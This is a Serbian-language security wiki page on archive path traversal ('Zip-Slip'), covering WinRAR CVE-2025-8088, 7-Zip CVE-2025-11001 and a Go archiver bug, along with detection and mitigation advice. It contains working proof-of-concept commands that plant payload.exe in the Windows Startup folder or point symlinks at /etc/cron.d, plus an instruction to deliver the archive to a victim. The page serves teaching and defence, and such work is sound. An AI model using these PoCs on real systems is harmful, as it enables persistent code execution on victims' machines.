# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi formati arhiva (ZIP, RAR, TAR, 7-ZIP, itd.) dopuštaju da svaki unos nosi svoju **internu putanju**. Kada alat za ekstrakciju bez razmišljanja prihvati tu putanju, maliciozno ime fajla koje sadrži `..` ili **absolute path** (npr. `C:\Windows\System32\`) biće upisano izvan direktorijuma koji je korisnik odabrao.
Ova klasa ranjivosti je široko poznata kao *Zip-Slip* ili **archive extraction path traversal**.

Posledice se kreću od prepisivanja proizvoljnih fajlova do direktnog postizanja **remote code execution (RCE)** tako što se payload postavi u **auto-run** lokaciju, poput Windows *Startup* foldera.

## Uzrok

1. Napadač kreira arhivu gde jedan ili više zaglavlja fajlova sadrže:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Žrtva ekstrahuje arhivu pomoću ranjivog alata koji veruje ugrađenoj putanji (ili prati symlinks) umesto da je sanitizuje ili nametne ekstrakciju unutar odabranog direktorijuma.
3. Fajl se upisuje na lokaciju koju kontroliše napadač i biće izvršen/učitan sledeći put kada sistem ili korisnik aktivira tu putanju.

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ako `entry.FullName` počinje sa `..\\`, dolazi do path traversal; ako je to **apsolutna putanja**, levi deo se potpuno odbacuje, što rezultira **proizvoljnim pisanjem fajla** kao identitetom ekstrakcije.
- Proof-of-concept arhiva za upis u susedni `app` direktorijum koji nadgleda zakazani skener:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Ubacivanje tog ZIP-a u nadgledani inbox rezultuje u `C:\samples\app\0xdf.txt`, što dokazuje traversal izvan `C:\samples\queue\` i omogućava follow-on primitives (npr. DLL hijacks).

## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) nije proveravao nazive fajlova prilikom ekstrakcije.
Zlonamerni RAR arhiv koji sadrži unos kao:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
završilo bi **izvan** izabranog izlaznog direktorijuma i unutar korisnikovog *Startup* foldera. Nakon prijave, Windows automatski izvršava sve što se tamo nalazi, obezbeđujući *persistent* RCE.

### Kreiranje PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opcije koje su korišćene:
* `-ep`  – sačuvaj putanje fajlova tačno kako su date (ne uklanjaj vodeći `./`).

Isporučite `evil.rar` žrtvi i uputite je da ga ekstrahuje pomoću ranjive verzije WinRAR-a.

### Primećena eksploatacija u prirodi

ESET je izvestio o RomCom (Storm-0978/UNC2596) spear-phishing kampanjama koje su slale RAR arhive koje zloupotrebljavaju CVE-2025-8088 za razmeštanje prilagođenih backdoora i olakšavanje ransomware operacija.

## Noviji slučajevi (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP unosi koji su **symbolic links** su dereferencirani tokom ekstrakcije, što je omogućavalo napadačima da pobegnu iz ciljne fascikle i prepišu proizvoljne putanje. Potrebna interakcija korisnika je samo *otvaranje/ekstraktovanje* arhive.
* **Pogođeno**: 7-Zip 21.02–24.09 (Windows & Linux build-ovi). Ispravljeno u **25.00** (jul 2025) i kasnijim verzijama.
* **Uticaj**: Prepisivanje `Start Menu/Programs/Startup` ili lokacija na kojima se pokreću servisi → kod se izvršava pri sledećem prijavljivanju ili restartu servisa.
* **Brzi PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na ispravljenoj verziji `/etc/cron.d` neće biti diran; symlink će biti ekstrahovan kao link unutar /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` prati `../` i symlink-ovane ZIP unose, pišući izvan `outputDir`.
* **Pogođeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat sada deprecated).
* **Rešenje**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere kanonskih putanja pre pisanja.
* **Minimalna reprodukcija**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Saveti za detekciju

* **Statička inspekcija** – Nabrojte unose u arhivi i označite svaki naziv koji sadrži `../`, `..\\`, *apsolutne putanje* (`/`, `C:`) ili unose tipa *symlink* čija meta je izvan destinacione fascikle.
* **Kanonalizacija** – Osigurajte da `realpath(join(dest, name))` i dalje počinje sa `dest`. Odbacite u suprotnom slučaju.
* **Ekstrakcija u sandbox** – Decompress-ujte u privremenu fasciklu koristeći *siguran* extractor (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i verifikujte da rezultujuće putanje ostanu unutar fascikle.
* **Endpoint monitoring** – Upozorite na nove izvršne fajlove zapisane u `Startup`/`Run`/`cron` lokacijama ubrzo nakon što je arhiva otvorena od strane WinRAR/7-Zip/itd.

## Ublažavanje i učvršćivanje

1. **Ažurirajte alat za ekstrakciju** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitaciju putanja/symlink-ova. Obe alatke i dalje nemaju auto-update.
2. Ekstrahujte arhive sa opcijom “**Do not extract paths**” / “**Ignore paths**” kada je to moguće.
3. Na Unixu, spustite privilegije i mount-ujte **chroot/namespace** pre ekstrakcije; na Windowsu koristite **AppContainer** ili sandbox.
4. Ako pišete sopstveni kod, normalizujte sa `realpath()`/`PathCanonicalize()` **pre** kreiranja/pisanja, i odbacite bilo koji unos koji izlazi iz destinacije.

## Dodatni pogođeni / istorijski slučajevi

* 2018 – Masivno upozorenje o *Zip-Slip* od strane Snyk koje je pogodilo mnoge Java/Go/JS biblioteke.
* 2023 – 7-Zip CVE-2023-4011 slična traversala tokom `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR ekstrakciona traversala u slug-ovima (patch u v1.2).
* Bilo koja prilagođena logika ekstrakcije koja ne poziva `PathCanonicalize` / `realpath` pre pisanja.

## Reference

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
